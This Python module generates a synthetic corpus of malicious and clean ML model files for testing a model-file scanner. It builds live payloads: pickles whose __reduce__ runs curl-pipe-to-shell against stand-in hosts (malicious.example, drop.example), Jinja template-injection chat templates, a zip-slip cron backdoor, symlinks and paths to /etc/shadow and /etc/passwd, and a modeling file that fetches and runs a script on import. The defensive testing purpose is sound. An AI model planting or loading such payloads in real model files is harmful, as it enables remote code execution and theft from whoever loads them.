"""Synthetic adversarial corpus.

One deliberately malicious sample per supported vector, plus a clean control for
every format, all generated from the standard library so the test suite needs no
fixtures in version control and no third-party model libraries.

Nothing here is executed by the scanner; the samples exist so the parsers can be
proven to *find* the payload, not to run it.
"""

from __future__ import annotations

import base64
import io
import json
import marshal
import os
import pickle
import struct
import tarfile
import zipfile
from pathlib import Path


# ---------------------------------------------------------------------------
# Pickle
# ---------------------------------------------------------------------------
class _SystemCall:
    def __reduce__(self):
        return (os.system, ("curl http://malicious.example/stage2.sh | sh",))


def evil_pickle() -> bytes:
    return pickle.dumps(_SystemCall(), protocol=4)


def evil_pickle_protocol0() -> bytes:
    return pickle.dumps(_SystemCall(), protocol=0)


class _EvalCall:
    """Indirect execution: the payload is a string handed to ``builtins.eval``."""

    def __reduce__(self):
        return (eval, ("__import__('os').system('id > /tmp/pwn')",))


def obfuscated_pickle() -> bytes:
    return pickle.dumps(_EvalCall(), protocol=4)


def concatenated_pickles() -> bytes:
    """Two streams in one payload: loaders read the first and ignore the second."""
    return clean_pickle() + evil_pickle()


def clean_pickle() -> bytes:
    return pickle.dumps({"epoch": 3, "loss": 0.021, "labels": ["cat", "dog"]}, protocol=4)


# ---------------------------------------------------------------------------
# SafeTensors
# ---------------------------------------------------------------------------
def _safetensors(header: dict, payload: bytes) -> bytes:
    blob = json.dumps(header).encode()
    return struct.pack("<Q", len(blob)) + blob + payload


def clean_safetensors(tensors: int = 4, tensor_bytes: int = 256) -> bytes:
    header = {}
    for index in range(tensors):
        start = index * tensor_bytes
        header[f"layer.{index}.weight"] = {
            "dtype": "F32",
            "shape": [tensor_bytes // 4],
            "data_offsets": [start, start + tensor_bytes],
        }
    header["__metadata__"] = {"format": "pt"}
    body = b"".join(
        struct.pack("<f", 0.01 * (index + 1)) * (tensor_bytes // 4) for index in range(tensors)
    )
    return _safetensors(header, body)


def safetensors_with_slack(payload: bytes = b"#!/bin/sh\ncurl http://evil.example/x | sh\n") -> bytes:
    header = {"w": {"dtype": "F32", "shape": [16], "data_offsets": [0, 64]}}
    return _safetensors(header, b"\x00" * 64 + payload + b"\x00" * 512)


def safetensors_overlapping() -> bytes:
    header = {
        "a": {"dtype": "F32", "shape": [16], "data_offsets": [0, 64]},
        "b": {"dtype": "F32", "shape": [16], "data_offsets": [32, 96]},
    }
    return _safetensors(header, b"\x00" * 96)


def safetensors_out_of_bounds() -> bytes:
    header = {"a": {"dtype": "F32", "shape": [16], "data_offsets": [0, 1 << 40]}}
    return _safetensors(header, b"\x00" * 64)


def safetensors_text_tensor() -> bytes:
    """A tensor region that is actually an embedded shell script."""
    script = (b"#!/bin/bash\nfor host in $(cat /etc/hosts); do\n"
              b"  curl -s http://drop.example/$host\ndone\n")
    body = (script * ((65536 // len(script)) + 1))[:65536]
    header = {"w": {"dtype": "F32", "shape": [16384], "data_offsets": [0, 65536]}}
    return _safetensors(header, body)


def safetensors_nan() -> bytes:
    body = struct.pack("<f", float("nan")) * 4096
    header = {"w": {"dtype": "F32", "shape": [4096], "data_offsets": [0, len(body)]}}
    return _safetensors(header, body)


# ---------------------------------------------------------------------------
# GGUF
# ---------------------------------------------------------------------------
def _gguf_string(value: bytes) -> bytes:
    return struct.pack("<Q", len(value)) + value


def _gguf(metadata: list[tuple[bytes, int, bytes]], tensor_count: int = 0) -> bytes:
    out = bytearray(b"GGUF" + struct.pack("<IQQ", 3, tensor_count, len(metadata)))
    for key, value_type, encoded in metadata:
        out += _gguf_string(key) + struct.pack("<I", value_type) + encoded
    padding = (-len(out)) % 32
    out += b"\x00" * padding
    return bytes(out)


def clean_gguf() -> bytes:
    return _gguf([
        (b"general.architecture", 8, _gguf_string(b"llama")),
        (b"general.alignment", 4, struct.pack("<I", 32)),
        (b"tokenizer.chat_template", 8,
         _gguf_string(b"{% for m in messages %}{{ m['content'] }}{% endfor %}")),
    ])


def gguf_ssti() -> bytes:
    payload = (b"{% for m in messages %}{{ m['content'] }}{% endfor %}"
               b"{{ ''.__class__.__mro__[1].__subclasses__() }}")
    return _gguf([
        (b"general.architecture", 8, _gguf_string(b"llama")),
        (b"tokenizer.chat_template", 8, _gguf_string(payload)),
    ])


def gguf_duplicate_key() -> bytes:
    return _gguf([
        (b"general.architecture", 8, _gguf_string(b"llama")),
        (b"general.architecture", 8, _gguf_string(b"mistral")),
    ])


# ---------------------------------------------------------------------------
# NumPy
# ---------------------------------------------------------------------------
def _npy(descriptor: str, payload: bytes, shape: tuple = (4,)) -> bytes:
    header = f"{{'descr': '{descriptor}', 'fortran_order': False, 'shape': {shape}, }}"
    padded = header + " " * ((64 - (10 + len(header) + 1) % 64) % 64) + "\n"
    return b"\x93NUMPY\x01\x00" + struct.pack("<H", len(padded)) + padded.encode() + payload


def clean_npy() -> bytes:
    return _npy("<f4", struct.pack("<4f", 1.0, 2.0, 3.0, 4.0))


def object_npy() -> bytes:
    return _npy("|O", evil_pickle())


def malicious_npz() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("weights.npy", clean_npy())
        archive.writestr("meta.npy", object_npy())
    return buffer.getvalue()


# ---------------------------------------------------------------------------
# PyTorch / archives
# ---------------------------------------------------------------------------
def malicious_torch_zip() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("model/data.pkl", evil_pickle())
        archive.writestr("model/version", "3\n")
        archive.writestr("model/code/__torch__/model.py",
                         "import subprocess\nsubprocess.run(['id'])\n")
    return buffer.getvalue()


def clean_torch_zip() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("model/data.pkl", clean_pickle())
        archive.writestr("model/version", "3\n")
        archive.writestr("model/data/0", b"\x00" * 1024)
    return buffer.getvalue()


def zip_slip() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("../../../../etc/cron.d/backdoor", "* * * * * root curl http://x|sh\n")
        archive.writestr("payload.so", b"\x7fELF\x02\x01\x01" + b"\x00" * 128)
    return buffer.getvalue()


def tar_with_symlink(path: Path) -> Path:
    target = path / "weights.tar"
    with tarfile.open(target, "w") as archive:
        info = tarfile.TarInfo("weights/link")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/shadow"
        archive.addfile(info)
        data = clean_pickle()
        member = tarfile.TarInfo("weights/data.pkl")
        member.size = len(data)
        archive.addfile(member, io.BytesIO(data))
    return target


def gzip_traversal() -> bytes:
    """gzip stores an original file name; the standard library strips directories,
    so the header is written by hand to reproduce a hostile producer."""
    import zlib

    inner = b"import os\nos.system('id')\n"
    compressor = zlib.compressobj(9, zlib.DEFLATED, -zlib.MAX_WBITS)
    payload = compressor.compress(inner) + compressor.flush()
    header = b"\x1f\x8b\x08\x08\x00\x00\x00\x00\x02\xff" + b"../../evil.py\x00"
    return header + payload + struct.pack("<II", zlib.crc32(inner) & 0xFFFFFFFF, len(inner))


# ---------------------------------------------------------------------------
# Keras
# ---------------------------------------------------------------------------
def _lambda_config() -> dict:
    code = compile("__import__('os').system('id')", "<lambda>", "exec")
    blob = base64.b64encode(marshal.dumps(code)).decode()
    return {
        "class_name": "Functional",
        "config": {
            "name": "model",
            "layers": [
                {"class_name": "InputLayer", "config": {"name": "input"}},
                {
                    "class_name": "Lambda",
                    "config": {
                        "name": "lambda",
                        "function": [blob, None, None],
                        "function_type": "lambda",
                    },
                    "module": "keras.layers",
                    "registered_name": None,
                },
            ],
        },
    }


def keras_h5() -> bytes:
    """A minimal HDF5-signed container carrying a Keras model_config attribute."""
    body = json.dumps(_lambda_config()).encode()
    return (
        b"\x89HDF\r\n\x1a\n" + b"\x00" * 8
        + b"model_config" + b"\x00" * 4 + body + b"\x00" * 64
    )


def keras_v3() -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("config.json", json.dumps(_lambda_config()))
        archive.writestr("metadata.json", json.dumps({"keras_version": "3.5.0"}))
        archive.writestr("model.weights.h5", b"\x89HDF\r\n\x1a\n" + b"\x00" * 256)
    return buffer.getvalue()


# ---------------------------------------------------------------------------
# Protocol Buffers (ONNX / SavedModel)
# ---------------------------------------------------------------------------
def _varint(value: int) -> bytes:
    out = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        out.append(byte | (0x80 if value else 0))
        if not value:
            return bytes(out)


def _field(number: int, wire: int) -> bytes:
    return _varint((number << 3) | wire)


def _string_field(number: int, value: bytes) -> bytes:
    return _field(number, 2) + _varint(len(value)) + value


def _message_field(number: int, value: bytes) -> bytes:
    return _string_field(number, value)


def malicious_onnx() -> bytes:
    node = (
        _string_field(1, b"input")          # input
        + _string_field(2, b"output")       # output
        + _string_field(3, b"evil_node")    # name
        + _string_field(4, b"PythonOp")     # op_type
        + _string_field(7, b"evil.custom")  # domain
    )
    external = _string_field(1, b"location") + _string_field(2, b"../../../../etc/passwd")
    initializer = (
        _field(1, 0) + _varint(4)
        + _field(2, 0) + _varint(1)
        + _message_field(13, external)
        + _field(14, 0) + _varint(1)
    )
    graph = _message_field(1, node) + _string_field(2, b"g") + _message_field(5, initializer)
    return (
        _field(1, 0) + _varint(9)
        + _string_field(2, b"evil-exporter")
        + _message_field(7, graph)
        + _message_field(8, _string_field(1, b"evil.custom") + _field(2, 0) + _varint(1))
    )


def clean_onnx() -> bytes:
    node = (
        _string_field(1, b"input") + _string_field(2, b"output")
        + _string_field(3, b"gemm") + _string_field(4, b"Gemm") + _string_field(7, b"")
    )
    graph = _message_field(1, node) + _string_field(2, b"g")
    return (
        _field(1, 0) + _varint(9)
        + _string_field(2, b"pytorch")
        + _message_field(7, graph)
        + _message_field(8, _string_field(1, b"") + _field(2, 0) + _varint(17))
    )


def malicious_savedmodel() -> bytes:
    node = _string_field(1, b"lambda_op") + _string_field(2, b"PyFunc")
    graph = _message_field(1, node)
    meta = _message_field(2, graph)
    return _message_field(2, meta)


# ---------------------------------------------------------------------------
# TFLite (hand-built FlatBuffer)
# ---------------------------------------------------------------------------
def tflite_custom_op(custom_code: bytes = b"EVIL") -> bytes:
    buffer = bytearray(64 + len(custom_code))
    struct.pack_into("<I", buffer, 0, 16)          # root uoffset
    buffer[4:8] = b"TFL3"
    struct.pack_into("<HHHH", buffer, 8, 8, 12, 4, 8)   # root vtable
    struct.pack_into("<i", buffer, 16, 8)          # root table soffset
    struct.pack_into("<I", buffer, 20, 3)          # version
    struct.pack_into("<I", buffer, 24, 4)          # -> operator_codes vector at 28
    struct.pack_into("<I", buffer, 28, 1)          # vector length
    struct.pack_into("<I", buffer, 32, 12)         # -> OperatorCode table at 44
    struct.pack_into("<HHHH", buffer, 36, 8, 8, 0, 4)   # OperatorCode vtable
    struct.pack_into("<i", buffer, 44, 8)          # OperatorCode soffset
    struct.pack_into("<I", buffer, 48, 4)          # -> string at 52
    struct.pack_into("<I", buffer, 52, len(custom_code))
    buffer[56:56 + len(custom_code)] = custom_code
    return bytes(buffer)


# ---------------------------------------------------------------------------
# Repository side-cars
# ---------------------------------------------------------------------------
AUTO_MAP_CONFIG = json.dumps({
    "model_type": "custom_arch",
    "architectures": ["CustomForCausalLM"],
    "auto_map": {
        "AutoConfig": "configuration_custom.CustomConfig",
        "AutoModelForCausalLM": "modeling_custom.CustomForCausalLM",
    },
}).encode()

SSTI_TOKENIZER_CONFIG = json.dumps({
    "tokenizer_class": "LlamaTokenizer",
    "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__()[400]('id',shell=True) }}",
}).encode()

CLEAN_CONFIG = json.dumps({
    "model_type": "llama", "architectures": ["LlamaForCausalLM"],
    "hidden_size": 4096, "num_hidden_layers": 32,
}).encode()

MALICIOUS_MODELING_PY = b"""
import os
import torch.nn as nn

os.system("curl -s http://drop.example/i.sh | bash")


class CustomForCausalLM(nn.Module):
    def forward(self, x):
        return x
"""

MALICIOUS_REQUIREMENTS = b"""
torch==2.4.0
transformers @ git+https://github.com/attacker/transformers@main
--extra-index-url http://packages.internal.example/simple
"""

DISGUISED_ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + struct.pack("<HHI", 2, 62, 1) + b"\x00" * 512


def write_corpus(root: Path) -> dict[str, Path]:
    """Materialise the whole corpus under ``root`` and return a name → path map."""
    root.mkdir(parents=True, exist_ok=True)
    samples: dict[str, bytes] = {
        "evil.pkl": evil_pickle(),
        "evil_proto0.pkl": evil_pickle_protocol0(),
        "obfuscated.pkl": obfuscated_pickle(),
        "concatenated.pkl": concatenated_pickles(),
        "clean.pkl": clean_pickle(),
        "clean.safetensors": clean_safetensors(),
        "slack.safetensors": safetensors_with_slack(),
        "overlap.safetensors": safetensors_overlapping(),
        "oob.safetensors": safetensors_out_of_bounds(),
        "script_in_tensor.safetensors": safetensors_text_tensor(),
        "nan.safetensors": safetensors_nan(),
        "clean.gguf": clean_gguf(),
        "ssti.gguf": gguf_ssti(),
        "dupkey.gguf": gguf_duplicate_key(),
        "clean.npy": clean_npy(),
        "object.npy": object_npy(),
        "bundle.npz": malicious_npz(),
        "malicious.pt": malicious_torch_zip(),
        "clean.pt": clean_torch_zip(),
        "slip.zip": zip_slip(),
        "traversal.gz": gzip_traversal(),
        "model.h5": keras_h5(),
        "model.keras": keras_v3(),
        "malicious.onnx": malicious_onnx(),
        "clean.onnx": clean_onnx(),
        "saved_model.pb": malicious_savedmodel(),
        "custom.tflite": tflite_custom_op(),
        "config.json": AUTO_MAP_CONFIG,
        "tokenizer_config.json": SSTI_TOKENIZER_CONFIG,
        "clean_config.json": CLEAN_CONFIG,
        "modeling_custom.py": MALICIOUS_MODELING_PY,
        "requirements.txt": MALICIOUS_REQUIREMENTS,
        "disguised.safetensors": DISGUISED_ELF,
    }
    written = {}
    for name, payload in samples.items():
        target = root / name
        target.write_bytes(payload)
        written[name] = target
    written["weights.tar"] = tar_with_symlink(root)
    return written


if __name__ == "__main__":  # pragma: no cover - manual corpus generation
    import sys

    destination = Path(sys.argv[1] if len(sys.argv) > 1 else "corpus")
    files = write_corpus(destination)
    print(f"wrote {len(files)} samples to {destination}")
